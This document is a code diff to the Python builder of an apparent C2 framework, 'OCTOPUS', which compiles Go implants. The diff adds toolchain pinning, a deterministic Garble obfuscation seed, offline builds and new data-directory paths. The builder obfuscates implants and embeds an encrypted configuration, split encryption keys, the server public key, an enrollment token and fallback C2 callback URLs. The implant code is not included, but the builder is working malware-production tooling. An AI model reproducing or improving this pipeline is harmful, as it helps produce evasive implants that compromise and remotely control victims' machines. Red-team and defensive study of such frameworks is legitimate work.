@@ -9,7 +9,10 @@ Features:
 """
 
 import base64
+import hashlib
+import json
 import os
+import re
 import subprocess
 import sys
 
@@ -17,12 +20,91 @@ from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import x25519
 
 from core.c2.protocol import C2_SESSION_KDF_CONTEXT
+from core.version import APPLICATION_VERSION
 
 C_GREEN  = "\033[92m"
 C_YELLOW = "\033[93m"
 C_RED    = "\033[91m"
 C_CYAN   = "\033[96m"
 C_RESET  = "\033[0m"
+
+_TOOLCHAIN_FILE = "toolchain.json"
+
+
+def _runtime_data_dir() -> str:
+    """Resolve writable C2 state without ever falling back to site-packages."""
+
+    configured = os.environ.get("OCTOPUS_DATA_DIR", "").strip()
+    if configured:
+        return os.path.abspath(os.path.expanduser(configured))
+
+    if os.name == "nt":
+        windows_state = os.environ.get("LOCALAPPDATA") or os.environ.get("APPDATA")
+        if windows_state:
+            return os.path.abspath(os.path.join(os.path.expanduser(windows_state), "Octopus"))
+        return os.path.abspath(os.path.expanduser("~/AppData/Local/Octopus"))
+
+    xdg_state = os.environ.get("XDG_STATE_HOME", "").strip()
+    if xdg_state and os.path.isabs(xdg_state):
+        return os.path.join(xdg_state, "octopus")
+    return os.path.abspath(os.path.expanduser("~/.local/state/octopus"))
+
+
+def _load_toolchain_contract(module_dir: str) -> tuple[str, str]:
+    """Load and validate the exact, release-owned Go toolchain contract."""
+
+    contract_path = os.path.join(module_dir, _TOOLCHAIN_FILE)
+    with open(contract_path, encoding="utf-8") as handle:
+        payload = json.load(handle)
+    if not isinstance(payload, dict) or set(payload) != {"schema_version", "go", "garble"}:
+        raise RuntimeError("Invalid C2 toolchain contract fields")
+    if payload["schema_version"] != 1:
+        raise RuntimeError("Unsupported C2 toolchain contract schema")
+
+    go_version = payload["go"]
+    garble_version = payload["garble"]
+    if not isinstance(go_version, str) or re.fullmatch(r"go\d+\.\d+\.\d+", go_version) is None:
+        raise RuntimeError("Invalid pinned Go version in C2 toolchain contract")
+    if not isinstance(garble_version, str) or re.fullmatch(r"v\d+\.\d+\.\d+", garble_version) is None:
+        raise RuntimeError("Invalid pinned Garble version in C2 toolchain contract")
+    return go_version, garble_version
+
+
+def _verify_toolchain(module_dir: str, env: dict[str, str]) -> tuple[str, str]:
+    """Verify exact local tool versions without resolving or downloading tools."""
+
+    expected_go, expected_garble = _load_toolchain_contract(module_dir)
+    go_result = subprocess.run(
+        ["go", "env", "GOVERSION"],
+        cwd=module_dir,
+        env=env,
+        check=True,
+        capture_output=True,
+        text=True,
+        timeout=15,
+    )
+    actual_go = go_result.stdout.strip()
+    if actual_go != expected_go:
+        raise RuntimeError(
+            f"C2 build requires Go {expected_go}; found {actual_go or 'unknown'}"
+        )
+
+    garble_result = subprocess.run(
+        ["garble", "version"],
+        cwd=module_dir,
+        env=env,
+        check=True,
+        capture_output=True,
+        text=True,
+        timeout=15,
+    )
+    match = re.search(r"(?:^|\s)mvdan\.cc/garble\s+(v\d+\.\d+\.\d+)(?:\s|$)", garble_result.stdout)
+    actual_garble = match.group(1) if match else "unknown"
+    if actual_garble != expected_garble:
+        raise RuntimeError(
+            f"C2 build requires Garble {expected_garble}; found {actual_garble}"
+        )
+    return expected_go, expected_garble
 
 
 def _go_linker_flags(
@@ -33,11 +115,36 @@ def _go_linker_flags(
     """Serialize build-time values, including the canonical wire context."""
     session_context = C2_SESSION_KDF_CONTEXT.decode("ascii")
     return (
-        f"-s -w -X 'main.EncBlob={config_blob}' "
+        f"-s -w -buildid= -X 'main.EncBlob={config_blob}' "
         f"-X 'main.KP1={key_part1}' "
         f"-X 'main.KP2={key_part2}' "
         f"-X 'main.SessionKDFContext={session_context}'"
     )
+
+
+def _garble_seed(
+    source_file: str,
+    module_dir: str,
+    os_target: str,
+    arch_target: str,
+) -> str:
+    """Derive a stable obfuscation seed from locked, non-secret build inputs."""
+
+    digest = hashlib.sha256()
+    digest.update(b"octopus-garble-seed-v1\0")
+    digest.update(os_target.encode("ascii"))
+    digest.update(b"\0")
+    digest.update(arch_target.encode("ascii"))
+    for path in (
+        source_file,
+        os.path.join(module_dir, "go.mod"),
+        os.path.join(module_dir, "go.sum"),
+        os.path.join(module_dir, _TOOLCHAIN_FILE),
+    ):
+        digest.update(b"\0")
+        with open(path, "rb") as handle:
+            digest.update(handle.read())
+    return base64.b64encode(digest.digest()).decode("ascii")
 
 def load_server_pub_key(key_path="data/keys/server_x25519_public.pem") -> str:
     """Return the raw 32-byte X25519 public key as base64."""
@@ -91,12 +198,13 @@ def build_implant(
     pins="",
     enrollment_token="",
 ):
-    base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-    key_path = os.path.join(base_dir, "data", "keys", "server_x25519_public.pem")
-    src_file = os.path.join(base_dir, "core", "c2", "implant.go")
+    core_c2_dir = os.path.dirname(os.path.abspath(__file__))
+    data_dir = _runtime_data_dir()
+    key_path = os.path.join(data_dir, "keys", "server_x25519_public.pem")
+    src_file = os.path.join(core_c2_dir, "implant.go")
     
     out_ext = ".exe" if os_target == "windows" else ""
-    out_file = os.path.join(base_dir, "data", f"implant_{os_target}_{arch_target}{out_ext}")
+    out_file = os.path.join(data_dir, f"implant_{os_target}_{arch_target}{out_ext}")
     
     if isinstance(c2_urls, (list, tuple)):
         c2_urls = ",".join(str(item) for item in c2_urls)
@@ -105,12 +213,13 @@ def build_implant(
     if arch_target not in {"amd64", "arm64"}:
         raise ValueError(f"Unsupported target architecture: {arch_target}")
 
+    os.makedirs(data_dir, exist_ok=True)
     server_pub = load_server_pub_key(key_path)
     if not enrollment_token:
         from core.c2.enrollment import EnrollmentAuthority
 
         enrollment_token = EnrollmentAuthority(
-            os.path.join(base_dir, "data", "keys", "enrollment.key")
+            os.path.join(data_dir, "keys", "enrollment.key")
         ).issue()
     
     print(f"  {C_CYAN}[*] Starting Garble Build Pipeline for {os_target}/{arch_target}{C_RESET}")
@@ -124,54 +233,69 @@ def build_implant(
     key_part1 = hex_key[:32]
     key_part2 = hex_key[32:]
     
-    # Setup ldflags to inject the encrypted blob and split keys
+    # Setup ldflags to inject the encrypted blob and split keys.
     ldflags = _go_linker_flags(config_blob, key_part1, key_part2)
-    
+
     env = os.environ.copy()
     env["GOOS"] = os_target
     env["GOARCH"] = arch_target
+    env["CGO_ENABLED"] = "0"
+    env["GOPROXY"] = "off"
+    env["GOSUMDB"] = "off"
+    env["GOWORK"] = "off"
+    env["GOTOOLCHAIN"] = "local"
+    garble_seed = _garble_seed(src_file, core_c2_dir, os_target, arch_target)
     
     # Command to build using garble
     cmd = [
         "garble",
+        "-seed",
+        garble_seed,
         "-tiny",
         "-literals",
         "build",
+        "-mod=readonly",
+        "-trimpath",
+        "-buildvcs=false",
         "-ldflags", ldflags,
         "-o", out_file,
         src_file
     ]
     
-    core_c2_dir = os.path.join(base_dir, "core", "c2")
-    
-    print(f"  {C_CYAN}[*] Downloading Go dependencies (go mod tidy)...{C_RESET}")
+    print(f"  {C_CYAN}[*] Verifying exact local Go/Garble toolchain...{C_RESET}")
+    try:
+        _verify_toolchain(core_c2_dir, env)
+    except FileNotFoundError as exc:
+        executable = exc.filename or "required executable"
+        print(f"  {C_RED}[!] C2 build tool is not installed or not in PATH: {executable}{C_RESET}")
+        print(
+            f"  {C_YELLOW}Install the exact versions declared in "
+            f"core/c2/{_TOOLCHAIN_FILE}; runtime downloads are disabled.{C_RESET}"
+        )
+        sys.exit(1)
+    except subprocess.CalledProcessError as exc:
+        detail = (exc.stderr or exc.stdout or "version probe failed").strip()
+        print(f"  {C_RED}[!] Failed to inspect the C2 build toolchain: {detail}{C_RESET}")
+        sys.exit(1)
+
+    print(f"  {C_CYAN}[*] Verifying pinned Go dependencies...{C_RESET}")
     try:
         subprocess.run(
-            ["go", "mod", "tidy"],
+            ["go", "mod", "verify"],
             cwd=core_c2_dir,
+            env=env,
             check=True,
             capture_output=True,
+            text=True,
             timeout=300,
         )
     except subprocess.CalledProcessError as e:
-        print(f"  {C_RED}[!] Failed to download Go dependencies:{C_RESET}\n{e.stderr.decode('utf-8', errors='ignore')}")
+        print(f"  {C_RED}[!] Failed to verify Go dependencies:{C_RESET}\n{e.stderr or ''}")
         sys.exit(1)
-        
-    try:
-        # Check if garble is installed
-        subprocess.run(
-            ["garble", "version"],
-            capture_output=True,
-            check=True,
-            timeout=15,
-        )
-    except FileNotFoundError:
-        print(f"  {C_RED}[!] 'garble' is not installed or not in PATH.{C_RESET}")
-        print(f"  {C_YELLOW}Install with: go install mvdan.cc/garble@latest{C_RESET}")
-        print(f"  {C_YELLOW}Also make sure ~/go/bin is in your PATH.{C_RESET}")
-        sys.exit(1)
-        
-    print(f"  {C_CYAN}[*] Running: {' '.join(cmd)}{C_RESET}")
+
+    # Do not print linker arguments: they contain the encrypted configuration
+    # key material and must not enter logs or terminal history.
+    print(f"  {C_CYAN}[*] Running locked offline Garble build...{C_RESET}")
     
     try:
         subprocess.run(
@@ -188,7 +312,9 @@ def build_implant(
 
 if __name__ == "__main__":
     import argparse
-    parser = argparse.ArgumentParser(description="OCTOPUS v9.2 Implant Builder")
+    parser = argparse.ArgumentParser(
+        description=f"OCTOPUS v{APPLICATION_VERSION} Implant Builder"
+    )
     parser.add_argument("--os", default="linux", help="Target OS (linux/windows/darwin)")
     parser.add_argument("--arch", default="amd64", help="Target Architecture (amd64/arm64)")
     parser.add_argument("--urls", default="http://127.0.0.1:8443", help="Comma-separated list of C2 URLs (Fallbacks)")
